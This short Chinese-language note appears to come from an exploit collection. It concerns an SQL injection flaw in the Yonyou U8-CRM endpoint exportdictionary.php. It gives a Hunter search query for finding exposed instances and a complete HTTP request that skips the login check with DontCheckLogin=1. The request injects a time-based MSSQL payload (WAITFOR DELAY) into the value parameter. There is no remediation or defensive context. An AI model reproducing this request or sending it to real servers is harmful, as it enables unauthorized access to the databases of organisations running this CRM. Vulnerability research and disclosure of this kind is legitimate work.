# 用友U8-CRM接口exportdictionary.php存在SQL注入漏洞

用友U8-CRM接口 /devtools/tools/exportdictionary.ph p存在SQL注入漏洞

## hunter

```yaml
app.name="用友 CRM"
```

## poc

```java
GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
```

